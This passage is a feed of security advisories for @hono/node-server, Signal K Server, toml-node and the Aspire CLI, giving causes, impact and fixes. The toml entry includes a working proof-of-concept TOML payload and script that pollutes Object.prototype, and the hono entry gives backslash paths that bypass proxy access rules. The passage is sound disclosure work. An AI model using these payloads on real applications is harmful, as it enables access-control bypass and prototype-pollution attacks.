Details

The upgrade handler awaits the application before attaching any listener to the socket. When middleware on the upgrade path does asynchronous work, such as an authentication lookup, a connection reset in that window has no handler. If a global uncaughtException handler swallows the error, the pending upgrade is never released and its entry is retained for the lifetime of the process.

The fix attaches error and close listeners to the socket before calling the application, releases the pending upgrade when the socket closes, and skips the handshake on a destroyed socket.

Impact

An unauthenticated client can terminate the server process with a single connection by sending a WebSocket upgrade request and resetting the connection before the application has responded. Where the crash is suppressed, repeated requests grow the heap.

This affects applications that enable WebSocket support in @hono/node-server and run asynchronous middleware or handlers on the upgrade path.

References

  • https://github.com/honojs/node-server/security/advisories/GHSA-qv5m-9pm6-hqp3
  • https://github.com/honojs/node-server/commit/61cc0267e613e684401f17c27538ba3bf97339a4
  • https://github.com/honojs/node-server/releases/tag/v2.1.6
  • https://github.com/advisories/GHSA-qv5m-9pm6-hqp3

entry.title: [@hono/node-server] @hono/node-server: Backslash in the request path is parsed as a path separator, bypassing path-based access control at a reverse proxy
entry.content:
Summary

@hono/node-server passes the raw request-target to the WHATWG URL parser, which treats a backslash in the path as / and then resolves .. segments. A request for /admin\secret or /public\..\admin/secret reaches the application as /admin/secret. A reverse proxy that follows RFC 3986 forwards the backslash unchanged and applies its path-based rules to the original path, so the request reaches a route the proxy is meant to block.

Details

A raw backslash is not allowed in a request-target (RFC 3986, RFC 9112 Section 3.2.1), and RFC 9112 Section 3.2 says a recipient should reject such a request rather than correct it. Proxies such as nginx on Linux, HAProxy and Envoy keep the backslash as an ordinary character, so they and the application see different paths.

The fix responds with 400 Bad Request to a request whose path contains a raw backslash, for HTTP/1.1, HTTP/2, absolute-form request-targets and WebSocket upgrades. A percent-encoded backslash and a backslash in the query string are still accepted.

Impact

An unauthenticated client can reach a route that a reverse proxy, load balancer or WAF in front of the application blocks by path.

This affects applications served by @hono/node-server behind a front component that makes path-based decisions and forwards a backslash unchanged. Access control inside the Hono application, such as middleware on /admin/*, runs on the rewritten path and is not affected.

References

  • https://github.com/honojs/node-server/security/advisories/GHSA-jpvv-r467-5p4w
  • https://github.com/honojs/node-server/commit/3868998a805ae79216535ad3986c1e7228dee313
  • https://github.com/honojs/node-server/commit/fb97395ec36af66567c76976e741110b02804d1c
  • https://github.com/honojs/node-server/releases/tag/v1.19.18
  • https://github.com/honojs/node-server/releases/tag/v2.1.6
  • https://github.com/advisories/GHSA-jpvv-r467-5p4w

entry.title: [signalk-server] Signal K Server: Buffered logs exposed to unauthenticated WebSocket clients
entry.content:
Summary

An unauthenticated WebSocket client can subscribe to the log path and receive buffered server logs.

WebSocket connections are intentionally permitted before authentication because login occurs over the WebSocket connection. However, the log subscription path does not enforce an authorization check.

processSubscribe handles subscriptions to the log path separately, without applying access control:

if (
  Array.isArray(msg.subscribe) &&
  msg.subscribe.length > 0 &&
  msg.subscribe[0].path === 'log'
) {
  if (!spark.logUnsubscribe) {
    spark.logUnsubscribe = startServerLog(app, spark)
  }
} else {
  // normal subscriptions go through subscriptionmanager, which applies
  // securityStrategy.filterReadDelta
}

startServerLog then replays the whole buffer to that socket:

app.logging.getLog().forEach((log) => {
  spark.write({ type: 'LOG', data: log })
})

The asymmetry is inside this one file. Writes are gated by securityStrategy.shouldAllowWrite (ws.ts:961), normal delta subscriptions are filtered by securityStrategy.filterReadDelta (ws.ts:1159, the else branch of this same function), and the log branch consults neither.

An unauthenticated socket, which is legitimately open for login, can subscribe to log and receive buffered server logs.

Fix: Requires an administrator principal, before startServerLog, in the same way the other branch defers to securityStrategy. The fix was released with version 2.31.0-beta.1.

The investigated code path was reviewed at commit 26ab199. No server was run and no WebSocket frames were captured. AI assistance was used during the investigation.

References

  • https://github.com/SignalK/signalk-server/security/advisories/GHSA-7m8x-x364-m26j

entry.title: [toml] toml-node: Prototype pollution: parsing a TOML document can write to Object.prototype
entry.content:
Summary

CVE-2026-63376 described prototype pollution through proto key-path desynchronization and was fixed in 4.1.2 by rewriting the path bookkeeping and adding an ownedContainers WeakSet. The desynchronization is still reachable, spelled with a quote character instead of a dot, and the owned-container check is not applied on the path that matters.

A four-line TOML document parsed with toml.parse() writes a property onto Object.prototype, where it is visible to every object in the process — including objects produced by unrelated libraries.

Details

Three gaps compose. All line numbers are lib/compiler.js in 5.0.0.

1. The path-key encoding is ambiguous. quoteDottedString() quotes a segment only when it contains a ., and never escapes a " inside the segment:

287:  function quoteDottedString(str) {
288:    if (str.indexOf(".") > -1) {
289:      return "\"" + str + "\"";
290:    } else {
291:      return str;
292:    }
293:  }

So the key path ['x.y'] and the key path ['"x', 'y"'] both render as the string "x.y". This is the same desynchronization CVE-2026-63376 named, with a quote in place of the dot.

2. A table-array header can clear another key's guard. addTableArray() walks assignedPaths / valueAssignments with isSameOrSubPath() over those ambiguous strings, so a header whose rendered path collides with an unrelated key deletes that key's entry.

3. The descent in assign() has no owned-container check. deepRef() applies isOwnedContainer() only to intermediate segments (lib/compiler.js:265, :273) and returns the final container unchecked. assign() then walks it with only a shape test:

 93:      target = target[k];
...
103:    target[lastKey] = reduced;

A TOML datetime is a Date. It satisfies typeof target[k] === "object" and is not an array, so the walk descends into it — and a Date has a live prototype chain to Object.prototype.

Putting the three together, a document can make the current table a Date and then walk __proto__.__proto__ to Object.prototype.

mkdir poc && cd poc && npm init -y >/dev/null && npm install toml@5.0.0

# poc.toml
"b.c" = 1979-05-27T07:32:00Z
[['"b']]
["b.c"]
__proto__.__proto__.polluted = "yes"

Line 1 defines a key whose rendered path is "b.c" and whose value is a Date. Line 2 is a table-array header whose rendered path collides with it, clearing its guard. Line 3 re-enters that key, so the current table is now the Date. Line 4 walks Date → Date.prototype → Object.prototype.

// poc.js
const toml = require('toml');
const fs = require('fs');

console.log('before:', JSON.stringify(({}).polluted));
toml.parse(fs.readFileSync('poc.toml', 'utf8'));
console.log('after: ', JSON.stringify(({}).polluted));
console.log('Object.prototype.hasOwnProperty("polluted") =', Object.prototype.hasOwnProperty('polluted'));
console.log('JSON.parse("{}").polluted =', JSON.stringify(JSON.parse('{}').polluted));

$ node poc.js
before: undefined
after:  "yes"
Object.prototype.hasOwnProperty("polluted") = true
JSON.parse("{}").polluted = "yes"

The payload sets a single harmless marker property. The last line shows the property is visible on an object this code never touched.

A useful control: the same document without line 2 (the guard-clearing header) is correctly rejected on 4.1.2 and later, which confirms the clearing step is what is load-bearing.

Impact

Any application that parses a TOML document from an untrusted source is affected — a configuration file uploaded by a user, a manifest from a third-party package or repository, a document posted to an API. Prototype pollution of this kind commonly escalates to authentication or authorization bypass, denial of service, and in applications with a suitable gadget, remote code execution, because every object in the process inherits the injected property.

Suggested fix: in assign(), apply the same check the intermediate descent already uses — after target = target[k], reject when !isOwnedContainer(target). Equivalently, apply isOwnedContainer to the value deepRef() returns. Separately, quoteDottedString() should escape " inside a segment so that distinct key paths cannot render to the same string.

entry.title: [@microsoft/aspire-cli-osx-arm64] Microsoft Security Advisory CVE-2026-120792 - Aspire Information Disclosure Vulnerability
entry.content:
Executive summary

Microsoft is releasing this security advisory to provide information about a vulnerability in the Aspire CLI. This advisory provides guidance on updating affected applications and components.

Insecure temporary files used by Aspire CLI can allow a local attacker to obtain sensitive configuration information.

Announcement

Announcement for this issue can be found at https://github.com/dotnet/announcements/issues/518

CVSS Details

  • Version: 3.1
  • Severity: High
  • Score: 7.3
  • Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:L
  • Weakness: CWE-532 (Insertion of Sensitive Information into Log File)
  • MSRC severity: Important
  • Impact: Information Disclosure

Affected Platforms

  • Platforms: Linux, macOS
  • Architectures: x64, Arm64

Affected Packages

Standalone Aspire CLI

Package Affected version Patched version
Aspire CLI (Aspire.Cli) >= 13.2.0, < 13.6.5 13.6.5
Aspire.Cli.linux-x64 >= 13.3.0, < 13.6.5 13.6.5
Aspire.Cli.linux-arm64 >= 13.3.0, < 13.6.5 13.6.5
Aspire.Cli.linux-musl-x64 >= 13.3.0, < 13.6.5 13.6.5
Aspire.Cli.osx-x64 >= 13.3.0, < 13.6.5 13.6.5
Aspire.Cli.osx-arm64 >= 13.3.0, < 13.6.5 13.6.5

Aspire CLI npm packages

Package Affected version Patched version
@microsoft/aspire-cli >= 13.4.2, < 13.6.5 13.6.5
@microsoft/aspire-cli-linux-x64 >= 13.4.2, < 13.6.5 13.6.5
@microsoft/aspire-cli-linux-arm64 >= 13.4.2, < 13.6.5 13.6.5
@microsoft/aspire-cli-linux-musl-x64 >= 13.4.2, < 13.6.5 13.6.5
@microsoft/aspire-cli-osx-x64 >= 13.4.2, < 13.6.5 13.6.5
@microsoft/aspire-cli-osx-arm64 >= 13.4.2, < 13.6.5 13.6.5

The affected component is the Aspire CLI's deprecated MCP configuration scanner, which ships in the CLI packages listed above. Its temporary-file diagnostics can include configuration content and use a fixed path in a shared temporary directory.

Advisory FAQ

How do I know if I am affected?

The reported scenario involves running Aspire CLI agent or MCP initialization commands on a non-Windows system with a temporary directory shared by multiple users. Versions 13.2.0 through 13.6.4 are affected.

Aspire ships independently of .NET. Installing a .NET runtime or SDK update does not establish that the affected Aspire CLI has been updated.

How do I fix the issue?

Update the Aspire CLI to version 13.6.5 or later. If installed as a .NET tool, update the Aspire.Cli package. If installed using npm, update @microsoft/aspire-cli to version 13.6.5 or later; its platform-specific dependency must also resolve to version 13.6.5 or later. Otherwise update the CLI through its installation method.

Other Information

Reporting Security Issues

If you have found a potential security issue in a supported version of .NET, please report it to the Microsoft Security Response Center (MSRC) via the MSRC Researcher Portal. Further information can be found in the MSRC Report an Issue FAQ.

Security reports made through MSRC may qualify for the Microsoft .NET Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at https://aka.ms/corebounty.

Support

You can ask questions about this issue in the Aspire repository.

Disclaimer
